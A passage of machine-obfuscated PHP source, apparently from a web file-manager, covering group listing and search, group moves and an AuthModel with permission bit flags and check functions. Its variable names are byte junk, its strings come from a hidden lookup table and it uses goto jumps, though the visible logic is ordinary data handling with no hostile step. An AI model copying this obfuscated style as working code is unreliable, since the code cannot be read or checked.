$Ü¦şµŞ))->_makeOrder()->selectPage(200); $this->_listDataApply($øñÒ¶•«[$Ü÷©Ùº[373]]); return $øñÒ¶•«; } public function listByID($§†¨äµè) { $æıèïÜ¦ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$§†¨äµè) { return array(); } $ÊŒ¶¤¢ = array($æıèïÜ¦[1807] => array($æıèïÜ¦[7], $§†¨äµè)); $‰ ôŸ¤º = $this->where($ÊŒ¶¤¢)->select(); $‰ ôŸ¤º = array_sort_keep($‰ ôŸ¤º, $æıèïÜ¦[1807], $§†¨äµè); $this->_listDataApply($‰ ôŸ¤º); return $‰ ôŸ¤º; } public function listSearch($ïæäÊ) { $Ä³²Ÿ§± =& $_SERVER[¥Ÿ©ÒèÌ]; $¶ÚÁšì = $ïæäÊ[$Ä³²Ÿ§±[1898]]; $’ÁÍó­Ë = isset($ïæäÊ[$Ä³²Ÿ§±[1899]]) ? $ïæäÊ[$Ä³²Ÿ§±[1899]] : !1; if (!trim($¶ÚÁšì)) { return !1; } $¶ÚÁšì = str_replace($Ä³²Ÿ§±[1900], $Ä³²Ÿ§±[1901], $¶ÚÁšì); $Æ“Ú²Œ¥ = array($Ä³²Ÿ§±[1807] => array($Ä³²Ÿ§±[387], "{$¶ÚÁšì}\45"), $Ä³²Ÿ§±[32] => array($Ä³²Ÿ§±[387], "\x25{$¶ÚÁšì}\x25"), $Ä³²Ÿ§±[986] => $Ä³²Ÿ§±[1902]); if ($’ÁÍó­Ë) { $£ÕÑ·’ = $this->getInfoSimple($’ÁÍó­Ë); $¯°¶Å›Ä = $£ÕÑ·’[$Ä³²Ÿ§±[521]] . $’ÁÍó­Ë . $Ä³²Ÿ§±[545]; $Æ“Ú²Œ¥ = array($Æ“Ú²Œ¥, array($Ä³²Ÿ§±[521] => array($Ä³²Ÿ§±[387], $¯°¶Å›Ä))); } $Æ“Ú²Œ¥ = $this->parseWhereLike($Æ“Ú²Œ¥); $ÚûÀ±¿ = $this->_makeOrder()->where($Æ“Ú²Œ¥)->selectPage(20); $ÚûÀ±¿ = $ÚûÀ±¿ ? $ÚûÀ±¿ : array($Ä³²Ÿ§±[373] => array(), $Ä³²Ÿ§±[370] => array()); if (!$ÚûÀ±¿ || count($ÚûÀ±¿[$Ä³²Ÿ§±[373]]) < 5 && Input::check($¶ÚÁšì, $Ä³²Ÿ§±[322])) { $á ğÕ¸ß = $this->groupChildrenAll($’ÁÍó­Ë); $é“ÅÖù = $this->_searchFromMeta($Ä³²Ÿ§±[463], $¶ÚÁšì, 10, $á ğÕ¸ß); $¶‡‹çå = $this->_searchFromMeta($Ä³²Ÿ§±[464], $¶ÚÁšì, 10, $á ğÕ¸ß); $Ûõ¿ğıÎ = array_merge($é“ÅÖù, $¶‡‹çå, $ÚûÀ±¿[$Ä³²Ÿ§±[373]]); $ÚûÀ±¿[$Ä³²Ÿ§±[373]] = array_unique_by_key($Ûõ¿ğıÎ, $Ä³²Ÿ§±[1807]); $ÚûÀ±¿[$Ä³²Ÿ§±[370]][$Ä³²Ÿ§±[371]] = count($ÚûÀ±¿[$Ä³²Ÿ§±[373]]); $ÚûÀ±¿[$Ä³²Ÿ§±[370]][$Ä³²Ÿ§±[372]] = ceil($ÚûÀ±¿[$Ä³²Ÿ§±[370]][$Ä³²Ÿ§±[371]] / $ÚûÀ±¿[$Ä³²Ÿ§±[370]][$Ä³²Ÿ§±[367]]); } $this->_listDataApply($ÚûÀ±¿[$Ä³²Ÿ§±[373]]); return $ÚûÀ±¿; } protected function groupChildrenAll($ŸåµË­û) { $Éäéªí =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ŸåµË­û) { return !1; } if (is_string($ŸåµË­û)) { $ŸåµË­û = array($ŸåµË­û); } $áÕ‹şŸÙ = $ŸåµË­û; foreach ($ŸåµË­û as $’Ù˜²’í) { $ôä÷¦ÀÜ = $this->getInfoSimple($’Ù˜²’í); $ÎïœÃÔª = array($Éäéªí[521] => array($Éäéªí[387], $ôä÷¦ÀÜ[$Éäéªí[521]] . $’Ù˜²’í . $Éäéªí[545])); $ÔÑˆÊş« = $this->field($Éäéªí[1807])->where($ÎïœÃÔª)->select(); $áÕ‹şŸÙ = array_merge($áÕ‹şŸÙ, array_to_keyvalue($ÔÑˆÊş«, $Éäéªí[12], $Éäéªí[1807])); } return array_unique($áÕ‹şŸÙ); } private function _searchFromMeta($Æ«‚ï÷, $µÕëƒä±, $û¼«¥ş, $´à¼›…µ) { $‘‘´Á” =& $_SERVER[¥Ÿ©ÒèÌ]; $µÕëƒä± = strtolower($µÕëƒä±); $ûâœÄºó = array($‘‘´Á”[95] => $Æ«‚ï÷, $‘‘´Á”[378] => array($‘‘´Á”[387], "\x25{$µÕëƒä±}\x25")); $ûâœÄºó = $this->parseWhereLike($ûâœÄºó); if ($´à¼›…µ) { $ûâœÄºó[$‘‘´Á”[1807]] = array($‘‘´Á”[7], $´à¼›…µ); } $åê¦Ëş¿ = Model($‘‘´Á”[1903])->where($ûâœÄºó)->limit($û¼«¥ş)->select(); if (!$åê¦Ëş¿) { return array(); } $åê¦Ëş¿ = array_to_keyvalue($åê¦Ëş¿, $‘‘´Á”[12], $‘‘´Á”[1807]); $Çå ØÓ = $this->where(array($‘‘´Á”[1894] => array($‘‘´Á”[7], $åê¦Ëş¿)))->select(); if (!$Çå ØÓ) { return array(); } return $Çå ØÓ; } protected function _listDataApplyItem($ô‹ó›¯¤) { $÷‰ö®¡Â = array($ô‹ó›¯¤); $this->_listDataApply($÷‰ö®¡Â); return $÷‰ö®¡Â[0]; } protected function _listDataApply(&$¢†Ä™¬Õ) { $õ°“é‰Ö =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$¢†Ä™¬Õ) { return; } $Ñ¡Å¤¿ë = array_to_keyvalue($¢†Ä™¬Õ, $õ°“é‰Ö[12], $õ°“é‰Ö[1807]); $this->_listAppendChildren($¢†Ä™¬Õ); $this->_listAppendChildrenMember($¢†Ä™¬Õ); $this->_listAppendMeta($¢†Ä™¬Õ, $Ñ¡Å¤¿ë); $this->_listAppendParent($¢†Ä™¬Õ); $this->_listAppendSourceRoot($¢†Ä™¬Õ, $Ñ¡Å¤¿ë); } private function _listAppendChildren(&$‹×å“”Å) { $È†¤Í€Í =& $_SERVER[¥Ÿ©ÒèÌ]; $îÍ¤—Ø = array_to_keyvalue($‹×å“”Å, $È†¤Í€Í[12], $È†¤Í€Í[1807]); $Àìøò¦¹ = array($È†¤Í€Í[498] => array($È†¤Í€Í[7], $îÍ¤—Ø)); $ìÔÅ¢¤¬ = array($È†¤Í€Í[498], $È†¤Í€Í[1904] => $È†¤Í€Í[500]); $®Û‚®Âî = $this->field($ìÔÅ¢¤¬)->where($Àìøò¦¹)->group($È†¤Í€Í[498])->select(); $Çç¡ïÔ = array_to_keyvalue($®Û‚®Âî, $È†¤Í€Í[498], $È†¤Í€Í[500]); foreach ($‹×å“”Å as &$è¹’©¢) { $½ıæàôû = $è¹’©¢[$È†¤Í€Í[1807]]; $è¹’©¢[$È†¤Í€Í[1905]] = isset($Çç¡ïÔ[$½ıæàôû]) ? intval($Çç¡ïÔ[$½ıæàôû]) : !1; } unset($è¹’©¢); } private function _listAppendChildrenMember(&$”Ã‹Õƒã) { $İ­îÉë =& $_SERVER[¥Ÿ©ÒèÌ]; $¦·øš»ª = array_to_keyvalue($”Ã‹Õƒã, $İ­îÉë[12], $İ­îÉë[1807]); $À¨îÈıØ = array($İ­îÉë[1807] => array($İ­îÉë[7], $¦·øš»ª)); $Ö¸Ö‘ = array($İ­îÉë[1807], $İ­îÉë[1904] => $İ­îÉë[500]); $‘à™ü¢Ï = Model($İ­îÉë[1896])->field($Ö¸Ö‘)->where($À¨îÈıØ)->group($İ­îÉë[1807])->select(); $µŞ—ª£— = array_to_keyvalue($‘à™ü¢Ï, $İ­îÉë[1807], $İ­îÉë[500]); foreach ($”Ã‹Õƒã as &$ôÉà) { $úŒËõ·È = $ôÉà[$İ­îÉë[1807]]; $ôÉà[$İ­îÉë[1906]] = isset($µŞ—ª£—[$úŒËõ·È]) ? intval($µŞ—ª£—[$úŒËõ·È]) : !1; } unset($ôÉà); } private function _listAppendMeta(&$îË‰«ò, $âüĞË®Ñ) { $Ââ—ûİ‰ =& $_SERVER[¥Ÿ©ÒèÌ]; $ıà˜££æ = array($Ââ—ûİ‰[1807] => array($Ââ—ûİ‰[7], $âüĞË®Ñ)); $…€ãôäÊ = Model($Ââ—ûİ‰[1895])->where($ıà˜££æ)->select(); $…€ãôäÊ = array_to_keyvalue_group($…€ãôäÊ, $Ââ—ûİ‰[1807]); foreach ($…€ãôäÊ as &$ñâ¨ÀˆË) { $ñâ¨ÀˆË = array_to_keyvalue($ñâ¨ÀˆË, $Ââ—ûİ‰[95], $Ââ—ûİ‰[378]); } unset($ñâ¨ÀˆË); foreach ($îË‰«ò as &$‘±ŒĞº) { $‘±ŒĞº[$Ââ—ûİ‰[465]] = array(); if (isset($…€ãôäÊ[$‘±ŒĞº[$Ââ—ûİ‰[1807]]])) { $‘±ŒĞº[$Ââ—ûİ‰[465]] = $…€ãôäÊ[$‘±ŒĞº[$Ââ—ûİ‰[1807]]]; } } unset($‘±ŒĞº); } protected function parentLevelArray($òşÑ•¤Ÿ) { $í®Ì»¤£ =& $_SERVER[¥Ÿ©ÒèÌ]; $òşÑ•¤Ÿ = explode($í®Ì»¤£[50], trim($òşÑ•¤Ÿ, $í®Ì»¤£[50])); $òşÑ•¤Ÿ = array_remove_value($òşÑ•¤Ÿ, $í®Ì»¤£[190]); return $òşÑ•¤Ÿ; } private function _listAppendParent(&$ÄÆˆ¿Ü³) { $ƒ¼ÄÆ¼Á =& $_SERVER[¥Ÿ©ÒèÌ]; $§¹×Ä³ = array(); foreach ($ÄÆˆ¿Ü³ as &$Àõèıêº) { $§¹×Ä³[$Àõèıêº[$ƒ¼ÄÆ¼Á[1807]]] = $Àõèıêº[$ƒ¼ÄÆ¼Á[32]]; $Â™ĞÙàˆ = $this->parentLevelArray($Àõèıêº[$ƒ¼ÄÆ¼Á[521]]); foreach ($Â™ĞÙàˆ as $·Îú‡ö’) { if (!isset($§¹×Ä³[$·Îú‡ö’])) { $§¹×Ä³[$·Îú‡ö’] = 0; } } } unset($Àõèıêº); foreach ($§¹×Ä³ as $¾¦²Æ±Ò => $ÁùÎêÈ¶) { if ($ÁùÎêÈ¶) { continue; } $é€Éİäæ = $this->getInfoSimple($¾¦²Æ±Ò); $§¹×Ä³[$¾¦²Æ±Ò] = $é€Éİäæ[$ƒ¼ÄÆ¼Á[32]]; } $ü±ñ‰ ô = $GLOBALS[$ƒ¼ÄÆ¼Á[6]][$ƒ¼ÄÆ¼Á[90]][$ƒ¼ÄÆ¼Á[1907]]; if ($GLOBALS[$ƒ¼ÄÆ¼Á[505]] == $ƒ¼ÄÆ¼Á[89]) { $ü±ñ‰ ô = !1; } foreach ($ÄÆˆ¿Ü³ as &$Àõèıêº) { $Â™ĞÙàˆ = $this->parentLevelArray($Àõèıêº[$ƒ¼ÄÆ¼Á[521]]); $§¿›åßş = $ƒ¼ÄÆ¼Á[12]; foreach ($Â™ĞÙàˆ as $¾¦²Æ±Ò => $·Îú‡ö’) { if ($ü±ñ‰ ô && $¾¦²Æ±Ò == 0) { continue; } $§¿›åßş .= $§¹×Ä³[$·Îú‡ö’] . $ƒ¼ÄÆ¼Á[8]; } if ($Â™ĞÙàˆ) { $§¿›åßş .= $Àõèıêº[$ƒ¼ÄÆ¼Á[32]]; } $Àõèıêº[$ƒ¼ÄÆ¼Á[526]] = str_replace($ƒ¼ÄÆ¼Á[529], $ƒ¼ÄÆ¼Á[8], $§¿›åßş); } unset($Àõèıêº); } private function _listAppendSourceRoot(&$“§ªÚ“, $àñÜ¯“) { $ŒĞ¿´å¼ =& $_SERVER[¥Ÿ©ÒèÌ]; $íÛ½†  = Model($ŒĞ¿´å¼[815])->listSourceRoot(SourceModel::TYPE_GROUP, $àñÜ¯“); $íÛ½†  = array_to_keyvalue($íÛ½† , $ŒĞ¿´å¼[504]); $íÛ½†  = array_remove_key($íÛ½† , $ŒĞ¿´å¼[504]); foreach ($“§ªÚ“ as &$©©úÉŸ‘) { $©©úÉŸ‘[$ŒĞ¿´å¼[87]] = $íÛ½† [$©©úÉŸ‘[$ŒĞ¿´å¼[1807]]] ? $íÛ½† [$©©úÉŸ‘[$ŒĞ¿´å¼[1807]]] : array(); } unset($©©úÉŸ‘); } protected function groupMerge($Šš•®) { $Šš•® = array_values(array_unique($Šš•®)); $Š÷ÀøĞš = array(); for ($ùïú§¡Ê = 0; $ùïú§¡Ê < count($Šš•®); $ùïú§¡Ê++) { $û²˜íù§ = !1; for ($¥È­ù‘å = 0; $¥È­ù‘å < count($Šš•®); $¥È­ù‘å++) { if ($ùïú§¡Ê == $¥È­ù‘å) { continue; } if ($this->isParentOf($Šš•®[$¥È­ù‘å], $Šš•®[$ùïú§¡Ê])) { $û²˜íù§ = !0; break; } } if (!$û²˜íù§) { $Š÷ÀøĞš[] = $Šš•®[$ùïú§¡Ê]; } } return $Š÷ÀøĞš; } protected function isParentOf($É°Î˜Š, $¬ÜÉäÙÙ) { $†Šş’Í¸ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$É°Î˜Š || !$¬ÜÉäÙÙ || $É°Î˜Š == $¬ÜÉäÙÙ) { return !1; } $İÚ¼òö = $this->getInfoSimple($É°Î˜Š); $”¹Üª«« = $this->getInfoSimple($¬ÜÉäÙÙ); $©Ø„İáí = $İÚ¼òö[$†Šş’Í¸[521]] . $É°Î˜Š . $†Šş’Í¸[50]; if (substr($”¹Üª««[$†Šş’Í¸[521]], 0, strlen($©Ø„İáí)) == $©Ø„İáí) { return !0; } return !1; } public function groupShowRoot($íœß‘¨×, $Ò†Âªˆ‚ = false) { $†úıÌµÈ =& $_SERVER[¥Ÿ©ÒèÌ]; $ï”‘‡ = $this->getInfo($íœß‘¨×); if (!$ï”‘‡) { return array(); } $Úå˜ëÖï = $this->parentLevelArray($ï”‘‡[$†úıÌµÈ[521]]); $÷…‘†ğ· = array($íœß‘¨×); if (count($Úå˜ëÖï) == 0) { return $÷…‘†ğ·; } if ($Ò†Âªˆ‚ && count($Úå˜ëÖï) == 1) { return $÷…‘†ğ·; } if (!$ï”‘‡[$†úıÌµÈ[465]] || !isset($ï”‘‡[$†úıÌµÈ[465]][$†úıÌµÈ[1892]]) || $ï”‘‡[$†úıÌµÈ[465]][$†úıÌµÈ[1892]] == $†úıÌµÈ[1861]) { return $this->groupShowRoot($Úå˜ëÖï[count($Úå˜ëÖï) - 1], $Ò†Âªˆ‚); } if ($ï”‘‡[$†úıÌµÈ[465]][$†úıÌµÈ[1892]] == $†úıÌµÈ[361]) { $ıÓ”èçÃ = explode($†úıÌµÈ[50], $ï”‘‡[$†úıÌµÈ[465]][$†úıÌµÈ[1893]]); if ($ıÓ”èçÃ) { $÷…‘†ğ· = array_merge($÷…‘†ğ·, $ıÓ”èçÃ); } } return $÷…‘†ğ·; } protected function resetParentLevel() { $Ñ¯çÄŸÎ =& $_SERVER[¥Ÿ©ÒèÌ]; $œ–æ…¿  = $Ñ¯çÄŸÎ[1807]; $µŞÄšÄ– = $this->select(); $µŞÄšÄ– = array_to_keyvalue($µŞÄšÄ–, $œ–æ…¿ ); foreach ($µŞÄšÄ– as $€Æ´ÀÏÅ) { $“ÛˆÅÑ» = $€Æ´ÀÏÅ; $ôµ½é½ = array(); while ($“ÛˆÅÑ»[$Ñ¯çÄŸÎ[498]] != 0) { $ôµ½é½[] = $“ÛˆÅÑ»[$Ñ¯çÄŸÎ[498]]; $“ÛˆÅÑ» = $µŞÄšÄ–[$“ÛˆÅÑ»[$Ñ¯çÄŸÎ[498]]]; } $ôµ½é½[] = 0; $ôµ½é½ = $Ñ¯çÄŸÎ[50] . implode($Ñ¯çÄŸÎ[50], array_reverse($ôµ½é½)) . $Ñ¯çÄŸÎ[50]; $this->setNamePinyin($€Æ´ÀÏÅ[$œ–æ…¿ ], $€Æ´ÀÏÅ[$Ñ¯çÄŸÎ[32]]); $this->where(array($œ–æ…¿  => $€Æ´ÀÏÅ[$œ–æ…¿ ]))->save(array($Ñ¯çÄŸÎ[584] => $ôµ½é½)); } return $µŞÄšÄ–; } public function groupNameAuto($ Ñ¾´à§, $€‰ÃÒ‡Å) { $¥Ú„Úò =& $_SERVER[¥Ÿ©ÒèÌ]; $¶Á¨ü’ = $this->where(array($¥Ú„Úò[402] => $ Ñ¾´à§))->getField($¥Ú„Úò[32], !0); if (!$¶Á¨ü’ || !in_array($€‰ÃÒ‡Å, $¶Á¨ü’)) { return $€‰ÃÒ‡Å; } for ($ŠÏÃˆ‡ = 1; $ŠÏÃˆ‡ <= count($¶Á¨ü’) + 1; $ŠÏÃˆ‡++) { $æÓšĞï‹ = $€‰ÃÒ‡Å . "\x28{$ŠÏÃˆ‡}\51"; if (!in_array($æÓšĞï‹, $¶Á¨ü’)) { return $æÓšĞï‹; } } } public function groupSwitch($½×è‚Ø¯, $–§ºˆœã) { $ÏçÌñÀ• =& $_SERVER[¥Ÿ©ÒèÌ]; $¾ÀÖßé— = array($ÏçÌñÀ•[1807] => array($ÏçÌñÀ•[7], array($½×è‚Ø¯, $–§ºˆœã))); $×äƒ®…‰ = $this->where($¾ÀÖßé—)->select(); $×äƒ®…‰ = array_to_keyvalue($×äƒ®…‰, $ÏçÌñÀ•[1807]); if (!isset($×äƒ®…‰[$½×è‚Ø¯]) || !isset($×äƒ®…‰[$–§ºˆœã]) || $×äƒ®…‰[$½×è‚Ø¯][$ÏçÌñÀ•[498]] == 0) { return !1; } $¾ÀÖßé— = array($ÏçÌñÀ•[1807] => $½×è‚Ø¯); $Ì¨—Ïäü = Model($ÏçÌñÀ•[1896])->where($¾ÀÖßé—)->select(); if (!$Ì¨—Ïäü) { $Ì¨—Ïäü = array(); } foreach ($Ì¨—Ïäü as $“±¼üôî) { $ƒ³å’µá = $“±¼üôî[$ÏçÌñÀ•[1639]]; $¾ÀÖßé— = array($ÏçÌñÀ•[1639] => $ƒ³å’µá, $ÏçÌñÀ•[1807] => $–§ºˆœã); $•œ¼£Ú = Model($ÏçÌñÀ•[1896])->where($¾ÀÖßé—)->find(); if (!$•œ¼£Ú) { $ºµéˆË¾ = array($–§ºˆœã => $“±¼üôî[$ÏçÌñÀ•[1908]]); Model($ÏçÌñÀ•[538])->userGroupAdd($ƒ³å’µá, $ºµéˆË¾); } Model($ÏçÌñÀ•[538])->userGroupRemove($ƒ³å’µá, $½×è‚Ø¯); } $¾ÀÖßé— = array($ÏçÌñÀ•[412] => 2, $ÏçÌñÀ•[498] => 0, $ÏçÌñÀ•[411] => 1, $ÏçÌñÀ•[504] => array($ÏçÌñÀ•[7], array($½×è‚Ø¯, $–§ºˆœã))); $åóâé» = Model($ÏçÌñÀ•[815])->where($¾ÀÖßé—)->field($ÏçÌñÀ•[1909])->select(); $åóâé» = array_to_keyvalue($åóâé», $ÏçÌñÀ•[504], $ÏçÌñÀ•[403]); $¨Ò¯ÅÍ§ = !empty($åóâé»[$½×è‚Ø¯]) ? $åóâé»[$½×è‚Ø¯] : !1; if ($¨Ò¯ÅÍ§) { if (!$åóâé»[$–§ºˆœã]) { $åóâé»[$–§ºˆœã] = Model($ÏçÌñÀ•[815])->groupRootAdd($–§ºˆœã); } $ñô‹—·£ = $åóâé»[$–§ºˆœã]; $¾ÀÖßé— = array($ÏçÌñÀ•[498] => $¨Ò¯ÅÍ§); $åóâé» = Model($ÏçÌñÀ•[815])->where($¾ÀÖßé—)->field($ÏçÌñÀ•[1910])->select(); if (!$åóâé») { $åóâé» = array(); } Model($ÏçÌñÀ•[815])->moveClearAuth = !1; foreach ($åóâé» as $©µºÌê) { $°ÛØ˜ˆÈ = $©µºÌê[$ÏçÌñÀ•[411]] == $ÏçÌñÀ•[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÏçÌñÀ•[815])->move($©µºÌê[$ÏçÌñÀ•[403]], $ñô‹—·£, $°ÛØ˜ˆÈ); } Model($ÏçÌñÀ•[815])->moveClearAuth = !0; $¾ÀÖßé— = array($ÏçÌñÀ•[412] => 2, $ÏçÌñÀ•[504] => $½×è‚Ø¯); $ä–ëÎ¥ä = array($ÏçÌñÀ•[504] => $–§ºˆœã); Model($ÏçÌñÀ•[1911])->where($¾ÀÖßé—)->save($ä–ëÎ¥ä); Model($ÏçÌñÀ•[1912])->where($¾ÀÖßé—)->save($ä–ëÎ¥ä); } $this->_changeChildLevel($×äƒ®…‰[$½×è‚Ø¯], $×äƒ®…‰[$–§ºˆœã], !0); $this->where(array($ÏçÌñÀ•[498] => $½×è‚Ø¯))->save(array($ÏçÌñÀ•[498] => $–§ºˆœã)); $this->_clearChildrenCache($×äƒ®…‰[$–§ºˆœã]); return !0; } } goto bÖÀ›¾ˆ•; fâµŠÛ´º™: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $âè»Ø“ =& $_SERVER[¥Ÿ©ÒèÌ]; $¡üüÀ‰ñ = array(array($âè»Ø“[421] => LNG($âè»Ø“[1808]), $âè»Ø“[1809] => $âè»Ø“[1810], $âè»Ø“[1811] => 1, $âè»Ø“[1812] => 1, $âè»Ø“[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($âè»Ø“[421] => LNG($âè»Ø“[1814]), $âè»Ø“[1809] => $âè»Ø“[1815], $âè»Ø“[1811] => 2, $âè»Ø“[1812] => 1, $âè»Ø“[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($âè»Ø“[421] => LNG($âè»Ø“[1816]), $âè»Ø“[1809] => $âè»Ø“[1817], $âè»Ø“[1811] => 3, $âè»Ø“[1812] => 1, $âè»Ø“[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($âè»Ø“[421] => LNG($âè»Ø“[1818]), $âè»Ø“[1809] => $âè»Ø“[1819], $âè»Ø“[1811] => 4, $âè»Ø“[1812] => 1, $âè»Ø“[1813] => self::AUTH_SHOW | self::AUTH_VIEW), array($âè»Ø“[421] => LNG($âè»Ø“[1820]), $âè»Ø“[1809] => $âè»Ø“[1821], $âè»Ø“[1811] => 5, $âè»Ø“[1812] => 1, $âè»Ø“[1813] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($âè»Ø“[421] => LNG($âè»Ø“[1822]), $âè»Ø“[1809] => $âè»Ø“[1823], $âè»Ø“[1811] => 6, $âè»Ø“[1812] => 1, $âè»Ø“[1813] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($âè»Ø“[421] => LNG($âè»Ø“[1824]), $âè»Ø“[1809] => $âè»Ø“[1825], $âè»Ø“[1811] => 7, $âè»Ø“[1812] => 1, $âè»Ø“[1813] => 0)); return $¡üüÀ‰ñ; } public static function authCheck($“™áíÒ³, $İ¿Ö£±Æ) { $“™áíÒ³ = intval($“™áíÒ³); if ($GLOBALS[$_SERVER[¥Ÿ©ÒèÌ][505]]) { return !0; } if ($“™áíÒ³ <= 0) { return !1; } if (($“™áíÒ³ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($“™áíÒ³ & $İ¿Ö£±Æ); } public static function authCheckShow($òÖÚÊÜÚ) { return self::authCheck($òÖÚÊÜÚ, self::AUTH_SHOW); } public static function authCheckView($¶¤†ş) { return self::authCheck($¶¤†ş, self::AUTH_VIEW); } public static function authCheckDownload($‘Ò àºø) { return self::authCheck($‘Ò àºø, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Æ°È…ÅÕ) { return self::authCheck($Æ°È…ÅÕ, self::AUTH_UPLOAD); } public static function authCheckEdit($Í‰¢æ¿É) { return self::authCheck($Í‰¢æ¿É, self::AUTH_EDIT); } public static function authCheckRemove($ÔÄş¬£é) { return self::authCheck($ÔÄş¬£é, self::AUTH_REMOVE); } public static function authCheckShare($ú¦ŒÎ€Ä) { return self::authCheck($ú¦ŒÎ€Ä, self::AUTH_SHARE); } public static function authCheckComment($óê“ÏÕû) { return self::authCheck($óê“ÏÕû, self::AUTH_COMMENT); } public static function authCheckEvent($À…Ÿëùõ) { return self::authCheck($À…Ÿëùõ, self::AUTH_EVENT); } public static function authCheckRoot($‡ğ¾ÌºÜ) { return self::authCheck($‡ğ¾ÌºÜ, self::AUTH_ROOT); } public static function authCheckAction($§Š¦İã‚, $’á„¶€ç) { $‘ÒËöÓÊ =& $_SERVER[¥Ÿ©ÒèÌ]; $‘¼¨Ã = array($‘ÒËöÓÊ[1826] => self::AUTH_VIEW, $‘ÒËöÓÊ[1183] => self::AUTH_DOWNLOAD, $‘ÒËöÓÊ[108] => self::AUTH_UPLOAD, $‘ÒËöÓÊ[1777] => self::AUTH_EDIT, $‘ÒËöÓÊ[1776] => self::AUTH_REMOVE, $‘ÒËöÓÊ[1787] => self::AUTH_SHARE, $‘ÒËöÓÊ[358] => self::AUTH_COMMENT, $‘ÒËöÓÊ[1627] => self::AUTH_EVENT, $‘ÒËöÓÊ[1827] => self::AUTH_ROOT); if (!isset($‘¼¨Ã[$’á„¶€ç])) { return; } $Çé‡Ïº‡ = $‘¼¨Ã[$’á„¶€ç]; $§Š¦İã‚ = intval($§Š¦İã‚); if ($§Š¦İã‚ <= 0) { return !1; } if (($§Š¦İã‚ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($§Š¦İã‚ & $Çé‡Ïº‡); } public static function authDisable($Èñƒ—›·, $ÆñÎŞñ) { if (intval($Èñƒ—›·) <= 0) { return 0; } return intval($Èñƒ—›·) & ~$ÆñÎŞñ; } public $optionType = "\x53\171\163\164\145\155\56\x73\x6f\165\162\143\145\x41\165\x74\x68\x4c\x69\163\164"; public $field = array("\156\141\x6d\x65", "\141\165\x74\x68", "\154\141\x62\145\154", "\144\x69\163\160\154\x61\x79", "\x73\x79\163\x74\145\x6d", "\x73\157\x72\x74"); public function initData() { $ó˜Î÷Ÿ¥ = $this->authDefault(); foreach ($ó˜Î÷Ÿ¥ as $à¬òÓÈø) { $this->add($à¬òÓÈø); } } public function findAuth($Æ’ŒÖÜª, $Ø¯©ğ«˜) { $œõáÌ®± =& $_SERVER[¥Ÿ©ÒèÌ]; $•–Û×¬¦ = parent::listData(); foreach ($•–Û×¬¦ as $¼…éç‘í) { $¦èÕı±ö = intval($¼…éç‘í[$œõáÌ®±[414]]); if ($¦èÕı±ö <= 0 || $¼…éç‘í[$œõáÌ®±[1828]] == 0) { continue; } if (($¦èÕı±ö & $Æ’ŒÖÜª) != $Æ’ŒÖÜª) { continue; } if (($¦èÕı±ö & $Ø¯©ğ«˜) != 0) { continue; } return $¼…éç‘í[$œõáÌ®±[401]]; } return !1; } public function findAuthReadOnly() { $³ ø­‡£ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ıè ò‘Í = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($³ ø­‡£, $ıè ò‘Í); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($üôÒ¡µú = false, $ÂúÕı  = "\163\x6f\x72\164", $ö÷ƒ—¨ì = false) { return parent::listData($üôÒ¡µú, $ÂúÕı , $ö÷ƒ—¨ì); } public function update($ˆğó­î­, $‘îæ½Ï£) { $ñºÖ•ú˜ =& $_SERVER[¥Ÿ©ÒèÌ]; $¿‘…™ôÑ = parent::listData($ˆğó­î­); $£‹äß¡  = $this->findByName($‘îæ½Ï£[$ñºÖ•ú˜[32]]); if (!$¿‘…™ôÑ || $£‹äß¡  && $£‹äß¡ [$ñºÖ•ú˜[401]] != $¿‘…™ôÑ[$ñºÖ•ú˜[401]]) { return !1; } $this->filterAuth($‘îæ½Ï£[$ñºÖ•ú˜[414]]); return parent::update($ˆğó­î­, $‘îæ½Ï£); } public function remove($â·‡Ÿæô) { $ç ğÖ¶¤ = parent::listData($â·‡Ÿæô); if (!$ç ğÖ¶¤ || $ç ğÖ¶¤[$_SERVER[¥Ÿ©ÒèÌ][1260]]) { return !1; } return parent::remove($â·‡Ÿæô); } public function add($×µüÎÂš = array()) { $Œ”¨òŞ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->findByName($×µüÎÂš[$Œ”¨òŞ[32]])) { return !1; } $ÑéÖìÁ = array($Œ”¨òŞ[32] => $Œ”¨òŞ[12], $Œ”¨òŞ[414] => 1, $Œ”¨òŞ[1829] => $Œ”¨òŞ[1817], $Œ”¨òŞ[1828] => 1, $Œ”¨òŞ[1260] => 0, $Œ”¨òŞ[1830] => 0); $×µüÎÂš = 